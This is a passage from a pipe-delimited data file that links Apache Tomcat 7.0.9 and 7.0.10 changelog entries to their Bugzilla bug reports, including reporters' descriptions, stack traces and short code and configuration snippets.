I think for the purposes of the getCanonicalName() call, the second argument should be set to false to prevent initialization of the class in question."|https://bz.apache.org/bugzilla/show_bug.cgi?id=50895
Catalina|Tomcat 7.0.10 (markt)|fix||CVE-2011-1088: Partial fix. Don't ignore @ServletSecurity annotations. (markt)|||
Catalina|Tomcat 7.0.10 (markt)|fix|27988|Improve reporting of missing files. (markt)|Unhelpful FileNotFoundException raised|"org.apache.naming.resources.DirContextURLConnection raises FileNotFoundException
on lines 311, 344, 382 and 396.  It would be more helpful if these provided a
message string.

For example, change line 344 to
        throw new FileNotFoundException(getURL().getFile());

This would make it easier to diagnose mistakes in server configurations."|https://bz.apache.org/bugzilla/show_bug.cgi?id=27988
Catalina|Tomcat 7.0.10 (markt)|fix|28852|Add URL encoding where missing to parameters in URLs presented by Ant tasks to the Manager application. Based on a patch by Stephane Bailliez. (markt)|failonerror attribute on Ant tasks|"failonerror boolean attribute on manager Ant tasks would be a nice have to 
allow for more flexible operation within Ant build files.

I will attach a patch next week that also fixes unecessary CRs during response 
read/print and missing url encoding in some tasks."|https://bz.apache.org/bugzilla/show_bug.cgi?id=28852
Catalina|Tomcat 7.0.10 (markt)|fix||Improve handling of SSL renegotiation by failing earlier when the request body contains more bytes than maxSavePostSize. (markt)|||
Catalina|Tomcat 7.0.10 (markt)|fix||Improve shut down speed by not renewing threads during shut down when the ThreadLocalLeakPreventionListener is enabled. (markt)|||
Coyote|Tomcat 7.0.10 (markt)|add|49284|Add SSL re-negotiation support to the HTTP NIO connector and extend test cases to cover CLIENT-CERT authentication. (fhanik/markt)|Implement SSL renegotiation for the NIO connector|Summary says it all. Entered as a reminder that it would be good to do this.|https://bz.apache.org/bugzilla/show_bug.cgi?id=49284
Catalina|Tomcat 7.0.9 (markt)|add|19444|Add an option to the JNDI realm to allow role searches to be performed by the authenticated user. (markt)|JNDI Authentication roles must be anonymous accessible|"It appears that for the JNDIRealm to be able to locate roles, they must be 
anonymous accessible. I believe that for security purposes this should not be 
necessary if we are validating the user by binding to the directory. In that 
case the roles could be accessible to any bound user or that particular user. I 
discussed this very briefly on the Tomcat user list. It sounds like this had 
been discussed previously and for whatever reason, the idea rejected. Anyhow I 
submit that there is a bug, either in the code - which requires the roles to be 
anonymous, or in the documentation which does not make it clear that this is 
the case (at least in ""Tomcat 4 Servlet/JSP Container - Realm Configuration HOW-
TO). It seems reasonable to me that if we are binding to the directory to 
authenticate, we would have that user's access to roles. Perhaps the 
documentation should more explicetly state that this is not the case.

In the hope that it would be accepted as an enhancement, I am going to attempt 
to attach a modified JNDIRealm that uses the authenticated connection to obtain 
the roles.

Thank You,
Art"|https://bz.apache.org/bugzilla/show_bug.cgi?id=19444
Catalina|Tomcat 7.0.9 (markt)|add|21669|Add the ability to specify the roleBase for the JNDI Realm as relative to the users DN. Based on a patch by Art W. (markt)|JNDIRealm roleBase pattern enahncement|"Currently the roleBase attribute must be a fxed location in the directory. A 
simple change would allow the role base to be specified relative to the user 
DN. My enhancement suggestion would change the roleBase definition as follows:

roleBase - the base entry for the role search. If not specified, the search 
base is the top level directory context. If specified it may optionally include 
pattern replacements ""{0}""..""{n}"" corrosponding to the name parts of the user's 
distinguished name (as returned by javax.naming.Name.get()).

For example, in the <Realm> defintion in server.xml you could specify the 
roleBase as:

    roleBase=""ou=Groups,{1},{0}""

The majority of the code to accomplish this would be in JNDIRealm.getRoles() 
and could look like this:

	String base = null;
	if ( roleBaseFormat != null )
	{
		NameParser np = context.getNameParser("""");
		Name name = np.parse(dn);
		String nameParts[] = new String[name.size()];
		for ( int idx = 0 ; idx < name.size() ; idx++ )
			nameParts[idx] = name.get(idx);
       	base = roleBaseFormat.format(nameParts);
	}

        // Perform the configured search and process the results
        if (debug >= 3) {
            log(""  Searching role base '"" + base + ""' for attribute '"" +
                roleName + ""'"");
            log(""  With filter expression '"" + filter + ""'"");
        }
        NamingEnumeration results =
            context.search(base, filter, controls);

Thank You,
Art"|https://bz.apache.org/bugzilla/show_bug.cgi?id=21669
Catalina|Tomcat 7.0.9 (markt)|add|22405|Add a new Lifecycle listener, org.apache.catalina.security.SecurityListener that prevents Tomcat from starting insecurely. It requires that Tomcat is not started as root and that a umask at least as restrictive as 0007 is used. This new listener is not enabled by default. (markt)|"warn if not deploy with umask ""0077"" or if deployed as ""root"" and provide tutorial URL ""Secure deployment"""|"The user managing web applications under tomcat is often root.
Typically root has ""umask 755"" and this makes sense for many tasks that have to
be accomplished as root.

However web applications often contain passwords to access for example a database.
Therefore, I suggest:
1) make sure that the permissions generated by attributes autoDeploy and
unpackWARs are 700
2) add a ""permissions"" attribute that allows to 
   i) use the default umask if it is set to ""umask""
   ii) set any other octal umask value for this"|https://bz.apache.org/bugzilla/show_bug.cgi?id=22405
Catalina|Tomcat 7.0.9 (markt)|fix|48863|Better logging when specifying an invalid directory for a class loader. Based on a patch by Ralf Hauser. (markt/kkolinko)|Log directory misconfiguration for class loaders|"When developing our tomcat applications with eclipse, doing out-rebuild/sysdeo plugin and have the class files written into TOMCAT_HOME/common/classes is an effective approach.

For manageability reasons, we need to split our code among several eclipse projects. The problem is if both are configured to place their .class files in TOMCAT_HOME/common/classes that when one project rebuilds, it will wipe the class files of the other one.

A great efficiency gain for the development of multiple projects therefore would be to be able to specify additional classes folders in server.xml to be added to the corresponding class-loader"|https://bz.apache.org/bugzilla/show_bug.cgi?id=48863
Catalina|Tomcat 7.0.9 (markt)|fix|48870|Refactor to remove use of parallel arrays. (markt)|avoid parallel arrays of base types|"Created attachment 25103 [details]
patch_parallelArrays.txt

having kind of 'synchronized' arrays, i.e. one of Strings and another one of Integers appears to be a questionable programming pattern to me.

Pls find attached a hopefully more OO approach

see also bug 48158"|https://bz.apache.org/bugzilla/show_bug.cgi?id=48870
Catalina|Tomcat 7.0.9 (markt)|add||Enhance the RemoteIpFilter and RemoteIpValve so that the modified remote address, remote host, protocol and server port may be used in an access log if desired. (markt)|||
Catalina|Tomcat 7.0.9 (markt)|fix||Restore access to Environments, Resources and ResourceLinks via JMX which was lost in early 7.0.x re-factoring. (markt)|||
Catalina|Tomcat 7.0.9 (markt)|update||Remove ServerLifecycleListener. This was already removed from server.xml and with the Lifecycle re-factoring is no longer required. (markt)|||
Catalina|Tomcat 7.0.9 (markt)|add||Add additional checks to ensure that sub-classes of org.apache.catalina.util.LifecycleBase correctly implement the expected state transitions. (markt)|||
Catalina|Tomcat 7.0.9 (markt)|fix|50189|Once the application has finished writing to the response, prevent further reads from the request since this causes various problems in the connectors which do not expect this. (markt)|AJP connector sends GET BODY CHUNK when reading after response closed|"If a servlet (probably incorrectly) closes the writer/outputstream of a response, and then attempts to read from the request, the AJP connector sends GET BODY CHUNK to the mod_jk worker.

This then starts a series of very confusing communication between the worker and tomcat.  The worker doesn't read it until it makes its next request.  After making its next request, it reads it, and then sends a response with 0 length.  At the same time, Tomcat responds to the request made by the worker with another GET BODY CHUNK, which the worker also responds with a message of 0 length.  Then the really weird thing happens, Tomcat replays the first request made by that worker.  At this point, based on what I'm looking at with tcpdump, I get too confused to work out exactly what is happening."|https://bz.apache.org/bugzilla/show_bug.cgi?id=50189
Catalina|Tomcat 7.0.9 (markt)|fix|50700|Ensure that the override attribute of context parameters is correctly followed. (markt)|Context parameters are being overridden with parameters from the web application deployment descriptor|"Context parameters are being overridden with parameters from the web application deployment descriptor even through ""override"" attribute is set to ""false""

For example:
lines from context file
<Context path=""/path"" docBase=""/path/to/docbase"" cookies=""true"">
    <Parameter name=""parameter_name"" value=""test1"" override=""false""/>
....
</Context>

lines from web.xml
    <context-param>
        <description>default value for parameter_name</description>
        <param-name>parameter_name</param-name>
        <param-value>test2</param-value>
    </context-param>

Now servletContext.getInitParameter(""parameter_name"") returns ""test2"""|https://bz.apache.org/bugzilla/show_bug.cgi?id=50700
Catalina|Tomcat 7.0.9 (markt)|fix|50721|Correctly handle URL decoding where the URL ends in %nn. Patch provided by Christof Marti. (markt)|RequestUtil.URLDecode() throws IllegalArgumentException for URLs with %xx-Code as last character|"When calling org.apache.catalina.util.RequestUtil.URLDecode() for a valid URL ending with a %xx-Code, the method throws the IllegalArgumentException ""The % character must be followed by two hexademical digits"".
This only happens, if the %xx-Code is at the  at the end of the URL. It works fine for URLs ending with normal characters.
Example:
RequestUtil.URLDecode(""http://localhost:8080/webdav/test%C3%A4"", ""UTF8"") fails
RequestUtil.URLDecode(""http://localhost:8080/webdav/test%C3%A4n"", ""UTF8"") works fine

The problem is with the the test in line 329 (added in revision: 905073):
if (ix + 2 >= len) {

Because the index ix is already incremented in line 325, after reading the current byte b (e.g. the %-character), this test fails if ""%A4"" is at the end, but does not fail for ""%A4n"".

Simple fix: In line 329 the '>=' should be replaced by a '>':
if (ix + 2 > len) {

This change should have no side effects, because ix is checked again before the next iteration.
Because this change is trivial I did not include a patch.

Best regards
Christof"|https://bz.apache.org/bugzilla/show_bug.cgi?id=50721
Catalina|Tomcat 7.0.9 (markt)|add|50737|Add additional information when an invalid WAR file is detected. (markt)|Error on .war deploy - archive malformed (on recent Tomcat releases) on IBM iSeries System i|"On Tomcat 6.0.20 a .war file can be deployed just fine on an IBM iSeries (System i) at V6R1 of the OS.

After installing Tomcat 6.0.29 (and 6.0.30 and 6.0.32), .war files no longer deploy.  See the stack trace at the bottom of this post.

On a Windows/7 machine this error does not occur with these Tomcat releases.  On OS400 (i5/OS) this does not happen at 6.0.20.  This error only occurs on the iSeries at Tomcat version 6.0.29+ (it may have started to occur between 6.0.20 and 6.0.29).  Note that it is the same .war file that is being deployed to each of these environments.

              ---- Tomcat ----
              6.0.20    6.0.32
            +--------+---------+
IBM iSeries |  OK    |  ERROR  |
            +--------+---------|
Windows/7   |  OK    |   OK    |
            +------------------+

In troubleshooting, to make sure this is not an installation/configuration error the Tomcat 6.0.20 zip file was downloaded from the Apache site and re-installed on the iSeries.  The deploy works as before.  At 6.0.29, 6.0.30, and 6.0.32, the deploy produces the following error:


Feb 8, 2011 2:52:07 PM org.apache.juli.logging.DirectJDKLog error
SEVERE: ContainerBase.addChild: start: 
LifecycleException:  Error initializaing :  java.lang.IllegalArgumentException: The archive [jar:file:/apache/apache-tomcat-6.0.32/webapps/shopatron.war!/] is malformed and will be ignored: an entry contains an illegal path [META-INF/]
	at java.lang.Throwable.<init>(Throwable.java:181)
	at java.lang.Exception.<init>(Exception.java:29)
	at org.apache.catalina.LifecycleException.<init>(LifecycleException.java:80)
	at org.apache.catalina.core.StandardContext.start(StandardContext.java:4450)
	at org.apache.catalina.core.ContainerBase.addChildInternal(ContainerBase.java:799)
	at org.apache.catalina.core.ContainerBase.addChild(ContainerBase.java:779)
	at org.apache.catalina.core.StandardHost.addChild(StandardHost.java:601)
	at org.apache.catalina.startup.HostConfig.deployWAR(HostConfig.java:943)
	at org.apache.catalina.startup.HostConfig.deployApps(HostConfig.java:563)
	at org.apache.catalina.startup.HostConfig.check(HostConfig.java:1397)
	at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)
	at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)
	at java.lang.reflect.Method.invoke(Method.java:575)
	at org.apache.tomcat.util.modeler.BaseModelMBean.invoke(BaseModelMBean.java:297)
	at com.sun.jmx.interceptor.DefaultMBeanServerInterceptor.invoke(DefaultMBeanServerInterceptor.java:836)
	at com.sun.jmx.mbeanserver.JmxMBeanServer.invoke(JmxMBeanServer.java:761)
	at org.apache.catalina.manager.ManagerServlet.check(ManagerServlet.java:1500)
	at org.apache.catalina.manager.HTMLManagerServlet.doPost(HTMLManagerServlet.java:252)
	at javax.servlet.http.HttpServlet.service(HttpServlet.java:637)
	at javax.servlet.http.HttpServlet.service(HttpServlet.java:717)
	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:290)
	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:206)
	at org.apache.catalina.filters.CsrfPreventionFilter.doFilter(CsrfPreventionFilter.java:186)
	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:235)
	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:206)
	at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:233)
	at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:191)
	at org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:563)
	at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:127)
	at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:102)
	at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:109)
	at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:298)
	at org.apache.coyote.http11.Http11Processor.process(Http11Processor.java:859)
	at org.apache.coyote.http11.Http11Protocol$Http11ConnectionHandler.process(Http11Protocol.java:588)
	at org.apache.tomcat.util.net.JIoEndpoint$Worker.run(JIoEndpoint.java:489)
	at java.lang.Thread.run(Thread.java:619)
Feb 8, 2011 2:52:07 PM org.apache.juli.logging.DirectJDKLog error
SEVERE: Error deploying web application archive shopatron.war
java.lang.IllegalStateException: ContainerBase.addChild: start: LifecycleException:  Error initializaing :  java.lang.IllegalArgumentException: The archive [jar:file:/apache/apache-tomcat-6.0.32/webapps/shopatron.war!/] is malformed and will be ignored: an entry contains an illegal path [META-INF/]
	at java.lang.Throwable.<init>(Throwable.java:196)
	at java.lang.Exception.<init>(Exception.java:41)
	at java.lang.RuntimeException.<init>(RuntimeException.java:43)
	at java.lang.IllegalStateException.<init>(IllegalStateException.java:38)
	at org.apache.catalina.core.ContainerBase.addChildInternal(ContainerBase.java:803)
	at org.apache.catalina.core.ContainerBase.addChild(ContainerBase.java:779)
	at org.apache.catalina.core.StandardHost.addChild(StandardHost.java:601)
	at org.apache.catalina.startup.HostConfig.deployWAR(HostConfig.java:943)
	at org.apache.catalina.startup.HostConfig.deployApps(HostConfig.java:563)
	at org.apache.catalina.startup.HostConfig.check(HostConfig.java:1397)
	at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)
	at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)
	at java.lang.reflect.Method.invoke(Method.java:575)
	at org.apache.tomcat.util.modeler.BaseModelMBean.invoke(BaseModelMBean.java:297)
	at com.sun.jmx.interceptor.DefaultMBeanServerInterceptor.invoke(DefaultMBeanServerInterceptor.java:836)
	at com.sun.jmx.mbeanserver.JmxMBeanServer.invoke(JmxMBeanServer.java:761)
	at org.apache.catalina.manager.ManagerServlet.check(ManagerServlet.java:1500)
	at org.apache.catalina.manager.HTMLManagerServlet.doPost(HTMLManagerServlet.java:252)
	at javax.servlet.http.HttpServlet.service(HttpServlet.java:637)
	at javax.servlet.http.HttpServlet.service(HttpServlet.java:717)
	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:290)
	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:206)
	at org.apache.catalina.filters.CsrfPreventionFilter.doFilter(CsrfPreventionFilter.java:186)
	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:235)
	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:206)
	at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:233)
	at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:191)
	at org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:563)
	at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:127)
	at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:102)
	at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:109)
	at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:298)
	at org.apache.coyote.http11.Http11Processor.process(Http11Processor.java:859)
	at org.apache.coyote.http11.Http11Protocol$Http11ConnectionHandler.process(Http11Protocol.java:588)
	at org.apache.tomcat.util.net.JIoEndpoint$Worker.run(JIoEndpoint.java:489)
	at java.lang.Thread.run(Thread.java:619)

=====

Let me know if I can do anything to help support this fix.
- Jon"|https://bz.apache.org/bugzilla/show_bug.cgi?id=50737
Catalina|Tomcat 7.0.9 (markt)|fix|50748|Allow the content length header to be set up to the point the response is committed when a writer is being used. (markt)|Ignoring setContentLength( ) when using writer is incomplete|"Reviewing o.a.c.connector.Response after comments in
https://issues.apache.org/bugzilla/show_bug.cgi?id=50747#c3

In o.a.c.connector.Response there is a feature that Response#setContentLength(int) ignores the call if usingWriter flag is true.


My comments are:

1) It concerns only multi-byte charsets such as UTF-8. There is nothing wrong with calling setContentLength() if it is a single-byte charset.

2) There is no such protection in Response#setHeader(), #setIntHeader(), #addHeader(), #addIntHeader() methods. Calling them will bypass the protection.

See how o.a.coyote.Response implements those methods and o.a.coyote.Response#checkSpecialHeader() for comparison."|https://bz.apache.org/bugzilla/show_bug.cgi?id=50748
Catalina|Tomcat 7.0.9 (markt)|fix|50751|When authenticating with the JNDI Realm, only attempt to read user attributes from the directory if attributes are required. (markt)|JNDIRealm invokes getAttributes with no attribute ids. Prevents using DOMAIN\{0} to login.|"Created attachment 26633 [details]
Patch for this issue vs. 6_0_29.

I would like to configure JNDIRealm to authenticate to an Active Directory server using userPattern=DOMAIN\{0}. Active Directory will accept this username in bind requests, however context.getAttributes(...) will fail if that name is used. JNDIRealm makes a request for user attributes before logging in, even when there are no user attributes to request. As a result, the above configuration fails with an InvalidNameException:

javax.naming.InvalidNameException: DOMAIN\username: [LDAP: error code 34 -
0000208F: LdapErr: DSID-0C090654, comment: Error processing name, data 0,
vece ]; remaining name 'DOMAIN\username

I have a patch for this (against 6.0.29) that I will attach. The patch fixes the issue for my specific case (bind mode, no roles), but it seems like there is a more fundamental problem in accessing the user's attributes before the user is even authenticated. This makes sense if it is configured for password comparison mode, but for bind mode it seems unnecessary until the user's password is validated. If only there were a way to get the DN of the authenticated user (not just the name that was used to authenticate), then it would be straightforward to fix this to query for roles after auth. I could not find such an API. I would be happy to write that patch if someone can point me in the right direction on that API.

More discussion on this issue from the tomcat-users list:

http://mail-archives.apache.org/mod_mbox/tomcat-users/201102.mbox/%3CAANLkTinTS3qBx5Wb6jLXCzozv+wTXQ9XwtJHN0O=FAXn@mail.gmail.com%3E"|https://bz.apache.org/bugzilla/show_bug.cgi?id=50751
Catalina|Tomcat 7.0.9 (markt)|fix|50752|Fix typo in debug message in deprecated Embedded class. (markt)|Typo in Embedded.java log message|"There's a debug log message in Embedded.java with a typo in it:

""INITIAL_CONTEXT_FACTORY alread set ""


Attached is a patch against the 6_0_29 tag, but the issue exists in tc6.0.x/trunk"|https://bz.apache.org/bugzilla/show_bug.cgi?id=50752
Catalina|Tomcat 7.0.9 (markt)|fix|50789|Provide an option to enable ServletRequestListeners for forwards as required by some CDI frameworks. (markt)|custom error pages and CDI/weld problem|"Created attachment 26662 [details]
test case

I can't seem to use CDI/weld in custom error pages.

A testcase is attached. Build with ""mvn install"", deploy. ""index.html"" links to ""404.jsf"". If you visit this url, the page is displayed correctly. If you go somewhere else, thereby provoking a 404, it should display the same. Instead, I see tomcat's generic 404 page and this stacktrace:

Feb 15, 2011 6:04:43 PM org.apache.catalina.core.ApplicationDispatcher invoke
SEVERE: Servlet.service() for servlet Faces Servlet threw exception
java.lang.IllegalStateException: Must call associate() before calling activate()
        at org.jboss.weld.context.AbstractConversationContext.activate(AbstractConversationContext.java:273)
        at org.jboss.weld.jsf.WeldPhaseListener.activateConversations(WeldPhaseListener.java:110)
        at org.jboss.weld.jsf.WeldPhaseListener.beforePhase(WeldPhaseListener.java:84)
        at com.sun.faces.lifecycle.Phase.handleBeforePhase(Phase.java:224)
        at com.sun.faces.lifecycle.Phase.doPhase(Phase.java:95)
        at com.sun.faces.lifecycle.RestoreViewPhase.doPhase(RestoreViewPhase.java:107)
        at com.sun.faces.lifecycle.LifecycleImpl.execute(LifecycleImpl.java:114)
        at javax.faces.webapp.FacesServlet.service(FacesServlet.java:308)
        at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:306)
        at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:210)
        at org.apache.catalina.core.ApplicationDispatcher.invoke(ApplicationDispatcher.java:672)
        at org.apache.catalina.core.ApplicationDispatcher.processRequest(ApplicationDispatcher.java:465)
        at org.apache.catalina.core.ApplicationDispatcher.doForward(ApplicationDispatcher.java:402)
        at org.apache.catalina.core.ApplicationDispatcher.forward(ApplicationDispatcher.java:329)
        at org.apache.catalina.core.StandardHostValve.custom(StandardHostValve.java:466)
        at org.apache.catalina.core.StandardHostValve.status(StandardHostValve.java:387)
        at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:181)
        at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:100)
        at org.apache.catalina.valves.AccessLogValve.invoke(AccessLogValve.java:541)
        at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:118)
        at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:383)
        at org.apache.coyote.http11.Http11AprProcessor.process(Http11AprProcessor.java:284)
        at org.apache.coyote.http11.Http11AprProtocol$Http11ConnectionHandler.process(Http11AprProtocol.java:322)
        at org.apache.tomcat.util.net.AprEndpoint$SocketProcessor.run(AprEndpoint.java:1684)
        at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:886)
        at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:908)
        at java.lang.Thread.run(Thread.java:662)
Feb 15, 2011 6:04:43 PM org.apache.catalina.core.StandardHostValve custom
SEVERE: Exception Processing ErrorPage[errorCode=404, location=/404.jsf]
javax.servlet.ServletException: Must call associate() before calling activate()
        at javax.faces.webapp.FacesServlet.service(FacesServlet.java:321)
        at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:306)
        at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:210)
        at org.apache.catalina.core.ApplicationDispatcher.invoke(ApplicationDispatcher.java:672)
        at org.apache.catalina.core.ApplicationDispatcher.processRequest(ApplicationDispatcher.java:465)
        at org.apache.catalina.core.ApplicationDispatcher.doForward(ApplicationDispatcher.java:402)
        at org.apache.catalina.core.ApplicationDispatcher.forward(ApplicationDispatcher.java:329)
        at org.apache.catalina.core.StandardHostValve.custom(StandardHostValve.java:466)
        at org.apache.catalina.core.StandardHostValve.status(StandardHostValve.java:387)
        at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:181)
        at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:100)
        at org.apache.catalina.valves.AccessLogValve.invoke(AccessLogValve.java:541)
        at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:118)
        at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:383)
        at org.apache.coyote.http11.Http11AprProcessor.process(Http11AprProcessor.java:284)
        at org.apache.coyote.http11.Http11AprProtocol$Http11ConnectionHandler.process(Http11AprProtocol.java:322)
        at org.apache.tomcat.util.net.AprEndpoint$SocketProcessor.run(AprEndpoint.java:1684)
        at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:886)
        at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:908)
        at java.lang.Thread.run(Thread.java:662)
Caused by: java.lang.IllegalStateException: Must call associate() before calling activate()
        at org.jboss.weld.context.AbstractConversationContext.activate(AbstractConversationContext.java:273)
        at org.jboss.weld.jsf.WeldPhaseListener.activateConversations(WeldPhaseListener.java:110)
        at org.jboss.weld.jsf.WeldPhaseListener.beforePhase(WeldPhaseListener.java:84)
        at com.sun.faces.lifecycle.Phase.handleBeforePhase(Phase.java:224)
        at com.sun.faces.lifecycle.Phase.doPhase(Phase.java:95)
        at com.sun.faces.lifecycle.RestoreViewPhase.doPhase(RestoreViewPhase.java:107)
        at com.sun.faces.lifecycle.LifecycleImpl.execute(LifecycleImpl.java:114)
        at javax.faces.webapp.FacesServlet.service(FacesServlet.java:308)
        ... 19 more

tomcat 7.0.8, java 1.6.0_23, windows XP SP3.

This issue reminds me of https://issues.apache.org/bugzilla/show_bug.cgi?id=49991, that was on the issue of using CDI/weld in the login/login failed pages used when doing form authentication."|https://bz.apache.org/bugzilla/show_bug.cgi?id=50789
Catalina|Tomcat 7.0.9 (markt)|fix|50793|When processing Servlet 3.0 async requests, ensure that the requestInitialized and requestDestroyed events are only fired once per request at the correct times. (markt)|Invalid DispatchType in ServletRequestListener on async dispatch|"If a ServletRequestListener is defined, when is invoked after a call to AsyncContext#dispatch() the DispatcherType returned from the ServletRequest is REQUEST rather than ASYNC. When the actual servlet is invoked, the type is correctly set to ASYNC.

If the listener is intended to be invoked for each dispatch, then the DispatcherType should match the value returned in the filter/servlet."|https://bz.apache.org/bugzilla/show_bug.cgi?id=50793
Catalina|Tomcat 7.0.9 (markt)|fix|50802|Ensure that ServletContext.getResourcePaths() includes static resources packaged in JAR files in its output. (markt)|Deviation from servlet3 spec concerning resource lookup from META-INF/resources|"Created attachment 26675 [details]
test application to reproduce. extract, deploy the war, make a query to root URL, see the system-out for evidence of standard-deviating behavior

Hi!

I'm writing you from ZeroTurnaround and we are currently building JRebel integration with new containers aiming to implement the servlet3 standard. I've stumbled on a bug in your implementation that is actually at the very core of the servlet standard and thus quite important, and actually a major issue for our integration.

Namely, i'm copy-pasting you a fragment of the reference javadoc of the servlet3 spec for the method ServletContext#getResourcePaths():

============= SPEC START =================

For example, for a web application containing:

   /welcome.html
   /catalog/index.html
   /catalog/products.html
   /catalog/offers/books.html
   /catalog/offers/music.html
   /customer/login.jsp
   /WEB-INF/web.xml
   /WEB-INF/classes/com.acme.OrderServlet.class
   /WEB-INF/lib/catalog.jar!/META-INF/resources/catalog/moreOffers/books.html
 

getResourcePaths(""/"") would return {""/welcome.html"", ""/catalog/"", ""/customer/"", ""/WEB-INF/""}, and getResourcePaths(""/catalog/"") would return {""/catalog/index.html"", ""/catalog/products.html"", ""/catalog/offers/"", ""/catalog/moreOffers/""}. 

============= SPEC END =================


Now run my test-application, you'll discover immediately that Tomcat doesn't respect that standard. getResourcesPath(""/catalog"") would not return ""/catalog/moreOffers"" if there were 2 embedded jars containing web-fragments. And even more importantly, had there been a new folder coming solely from a jar's META-INF/resources, this wouldn't get listed with getResourcePaths(""/"").

Please note that these are important issues! Many frameworks rely on various scanning techniques for recursive resource lookup, and so forth.

I've tested this thing with Tomcat 7.0.6 and 7.0.8, problems are present with both.

(Btw, we've received information about the same problems from users of latest glassfish version as well.. i think they are just re-using this part of tomcat and thus getting the same problems... not sure.)

Thanks a lot if you can have a look at this!"|https://bz.apache.org/bugzilla/show_bug.cgi?id=50802
Catalina|Tomcat 7.0.9 (markt)|add||Web crawlers can trigger the creation of many thousands of sessions as they crawl a site which may result in significant memory consumption. The new Crawler Session Manager Valve ensures that crawlers are associated with a single session - just like normal users - regardless of whether or not they provide a session token with their requests. (markt)|||
Catalina|Tomcat 7.0.9 (markt)|fix||Don't attempt to start NamingResources for Contexts multiple times. (markt)|||
Catalina|Tomcat 7.0.9 (markt)|fix|50826|Avoid IllegalArgumentException if an embedded Tomcat instance that includes at least one Context is destroyed without ever being started. (markt)|(Embedded) Tomcat.destroy() throws java.lang.IllegalArgumentException|"Embedded Tomcat sometimes throws this exception when calling destroy() method:

java.lang.IllegalArgumentException: null source
	at java.util.EventObject.<init>(EventObject.java:56)
	at javax.management.Notification.<init>(Notification.java:184)
	at org.apache.catalina.core.StandardContext.destroyInternal(StandardContext.java:5433)
	at org.apache.catalina.util.LifecycleBase.destroy(LifecycleBase.java:285)
	at org.apache.catalina.core.ContainerBase.removeChild(ContainerBase.java:969)
	at org.apache.catalina.core.ContainerBase.destroyInternal(ContainerBase.java:1108)
	at org.apache.catalina.util.LifecycleBase.destroy(LifecycleBase.java:285)
	at org.apache.catalina.core.ContainerBase.removeChild(ContainerBase.java:969)
	at org.apache.catalina.core.ContainerBase.destroyInternal(ContainerBase.java:1108)
	at org.apache.catalina.util.LifecycleBase.destroy(LifecycleBase.java:285)
	at org.apache.catalina.core.StandardService.destroyInternal(StandardService.java:593)
	at org.apache.catalina.util.LifecycleBase.destroy(LifecycleBase.java:285)
	at org.apache.catalina.core.StandardServer.destroyInternal(StandardServer.java:786)
	at org.apache.catalina.util.LifecycleBase.destroy(LifecycleBase.java:285)
	at org.apache.catalina.startup.Tomcat.destroy(Tomcat.java:323)
	at su.msk.jet.nioproxy.rule.config.EmbeddedWebserver.stop(EmbeddedWebserver.java:26)

I think that StandardContext.destroyInternal() misses check that this.getObjectName()!=null"|https://bz.apache.org/bugzilla/show_bug.cgi?id=50826
Catalina|Tomcat 7.0.9 (markt)|fix||Ensure a web application is taken out of service if the web.xml file is not valid. (kkolinko/markt)|||
Catalina|Tomcat 7.0.9 (markt)|fix||Ensure Servlet 2.2 jspFile elements are correctly converted to use a leading '/' if missing. (markt)|||
Catalina|Tomcat 7.0.9 (markt)|fix|50836|Better documentation of the meaning of Lifecycle.isAvailable() and correct a couple of cases where this could incorrectly return true. (markt)|LifecycleState#isAvailable() to be more restrictive|"I think some of the values returned by LifecycleState#isAvailable() are wrong.

1. I am certain that MUST_DESTROY should return false, because it is a state that is later than stopped.
2. I think that STOPPING_PREP should return false, because we can get there from the FAILED state.
3. I think that STARTING should return false, because it is too early to return true there.

As a result, the following is the complete list of states are to return true in #isAvailable():
